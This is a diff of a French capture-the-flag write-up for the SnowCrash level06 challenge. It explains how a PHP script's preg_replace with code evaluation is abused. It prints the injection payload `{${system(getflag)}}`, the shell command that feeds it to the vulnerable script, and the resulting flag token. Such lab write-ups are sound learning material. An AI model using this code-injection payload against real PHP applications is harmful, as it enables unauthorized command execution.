@@ -9,7 +9,6 @@ total 12
 cat level06.php
 ```
 
-
 ```php
 #!/usr/bin/php
 <?php
@@ -32,11 +31,19 @@ print $r;
 ```
 
 - `preg_replace` est la seule fonction appellee, en googlant 'preg_replace exploit' on trouve [ca](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
-- Le script perl:
-	1. lit un fichier dont le nom est passe en deuxieme argument
+- Le script php:
+	1. lit un fichier dont le nom est passé en deuxieme argument
 	2. passe le contenu de ce fichier a travers une regex de substitution
 	3. execute le code
-- On veut excecuter getflag dans un terminal, ce qui donne en perl `system(getflag)`
+
+Exemple:
+```
+level06@SnowCrash:~$ echo "lol" > /var/crash/test
+level06@SnowCrash:~$ ./level06 "/var/crash/test"
+lol
+```
+
+- On veut excecuter getflag dans un terminal, ce qui donne en php `system(getflag)`
 - On doit donc ecrire dans un fichier une string qui apres transformation par la regex donne `system(getflag)`
 - Une session de bidouille intense sur ce [site](https://www.functions-online.com/preg_replace.html) de regex nous permet de trouver la solution: `{${system(getflag)}}`
 
@@ -49,7 +56,7 @@ PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user
 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
 ```
+On a trouvé notre Flag!
 
-
-`echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol`
-- On peut se log avec `wiok45aaoguiboiki2tuin6ub`
+## ⚡ Flag
+`wiok45aaoguiboiki2tuin6ub`
